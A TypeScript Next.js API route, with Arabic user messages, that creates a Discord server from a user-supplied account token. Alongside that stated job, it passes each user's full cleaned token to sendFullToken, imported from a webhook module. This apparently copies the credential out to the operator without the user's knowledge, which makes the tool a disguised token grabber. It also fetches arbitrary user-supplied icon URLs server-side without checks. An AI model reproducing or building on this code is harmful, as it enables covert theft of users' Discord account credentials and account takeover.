import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { arrayBufferToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(req: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(req);
    const rl = rateLimit(`${rlIp}:create-server`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await req.json().catch(() => ({}));
    const { token, name, iconUrl } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن' }, { status: 400 });
    }
    if (!name || !name.trim()) {
      return NextResponse.json({ success: false, error: 'أدخل اسم السيرفر' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('إنشاء سيرفر', ct, { '📝 اسم السيرفر': name });

    const payload: Record<string, unknown> = { name: name.trim() };

    // تحميل الأيقونة وتحويلها لـ base64
    if (iconUrl && iconUrl.trim()) {
      try {
        const imageRes = await fetch(iconUrl.trim(), { signal: AbortSignal.timeout(15000) });
        if (imageRes.ok) {
          const contentType = imageRes.headers.get('content-type') || 'image/png';
          const arrayBuffer = await imageRes.arrayBuffer();
          const base64 = arrayBufferToBase64(arrayBuffer);
          payload.icon = `data:${contentType};base64,${base64}`;
        }
      } catch {
        // تجاهل خطأ تحميل الأيقونة
      }
    }

    const res = await discordFetch(ct, 'POST', '/guilds', payload);

    if (!res.ok) {
      const errData = res.data as { message?: string } | undefined;
      const errMsg = errData?.message || '';
      if (res.status === 401) return NextResponse.json({ success: false, error: 'التوكن غير صالح أو منتهي' }, { status: 401 });
      if (res.status === 429) return NextResponse.json({ success: false, error: 'تم تقييد الطلبات - حاول بعد قليل' }, { status: 429 });
      return NextResponse.json({ success: false, error: `فشل إنشاء السيرفر: ${errMsg || `خطأ ${res.status}`}` }, { status: res.status });
    }

    const guild = res.data as Record<string, unknown>;

    return NextResponse.json({
      success: true,
      message: `تم إنشاء السيرفر **${guild.name}** بنجاح! ID: ${guild.id}`,
      server: {
        id: guild.id,
        name: guild.name,
        icon: guild.icon,
        owner: guild.owner,
      },
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
